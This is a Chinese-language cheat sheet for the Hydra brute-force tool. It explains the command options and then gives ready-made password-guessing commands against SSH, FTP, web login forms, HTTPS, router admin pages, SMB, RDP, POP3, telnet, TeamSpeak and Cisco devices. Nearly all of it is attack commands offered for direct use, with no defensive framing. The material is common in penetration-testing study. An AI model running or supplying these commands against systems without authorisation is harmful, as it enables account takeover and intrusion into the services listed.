### Hydra

#### 语法

```text
语法：Hydra 参数 IP 服务
```

#### 参数

```bash
参数：
-l  login 小写，指定用户名进行破解
-L  file 大写，指定用户的用户名字典
-p  pass 小写，用于指定密码破解，很少使用，一般采用密码字典。
-P  file 大写，用于指定密码字典。
-e  ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-M  file 指定目标ip列表文件，批量破解。
-o  file 指定结果输出文件
-f  找到第一对登录名或者密码的时候中止破解。
-t  tasks 同时运行的线程数，默认是16
-w  time 设置最大超时时间，单位
-v / -V 显示详细过程
-R  恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）
-x  自定义密码。
```

```
service：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。
注意：
1.自己创建字典,然后放在当前的目录下或者指定目录。
2.参数可以统一放在最后，格式比如hydra ip 服务 参数。
3.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。
4.缺点，如果目标网站登录时候需要验证码就无法破解。
5.man hydra最万能。
6.或者hydra -U http-form等查看具体帮助。
```



#### 简单使用

```bash
root@kali:/mnt# hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh
```

#### 各种协议破解汇总

**FTP协议破解**

```bash
破解ftp：
 
hydra -L 用户名字典 -P 密码字典 -t 6 -e ns IP地址 -v
```

**http协议破解**

```bash
get方式提交，破解web登录：
 
hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns IP地址 http-get /admin/
hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns -f IP地址 http-get /admin/index.php
 
post方式提交，破解web登录：
 
hydra -f -l 用户名 -P 密码字典 -V -s 9900 IP地址 http-post-form "/admin/index.php?action=login:user=USER&pw=PASS:"
 
 
#/index.php …这个是登录的 url
#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替
#然后是如果登录出错 会出现的字符 。。。然后开始破解
```

**https协议破解**

```bash
破解https
 
hydra -m /index.php -l 用户名 -P 密码字典.txt IP地址 https
```

**路由器破解**

```bash
hydra -l admin -x 6:10:1a.~!@#$%^&()-= -t 8 192.168.1.1 http-get /
-l admin 为尝试破解的用户名。
 
# -x 6:10:1a. 表示枚举的密码由 数字、小写字母和单字符’.'等等组成，长度为 6 - 10 位。-t 8 表示分 8 个并行任务进行爆破尝试。192.168.1.1 为 Router 地址。http-get 为破解方式（协议）
```

**http-proxy协议破解**

```bash
破解http-proxy：
 
hydra -l admin -P 字典.txt http-proxy://IP地址
```

**smb破解**

```bash
破解smb：
 
hydra -l 用户名字典 -P 密码字典 IP地址 smb
```

**Windows远程桌面**

```bash
破解rdp(windows远程登录)：
 
hydra ip地址 rdp -l administrator -P 密码字典.txt -V
```

**邮箱pop3**

```bash
破解邮箱pop3：
 
hydra -l 用户名 -P 密码字典.txt my.pop3.mail pop3
```

**telnet破解**

```bash
hydra ip地址 telnet -l 用户字典.txt -P 密码字典.txt -t 32 -s 23 -e ns -f -V
```

**语音通讯工具teamspeak**

```bash
hydra -l 用户名字典 -P 密码字典.txt -s 端口号 -vV ip teamspeak
```

**cisco**

```bash
hydra -P 密码字典 IP地址 cisco
hydra -m cloud -P 密码字典 IP地址 cisco-enable
```





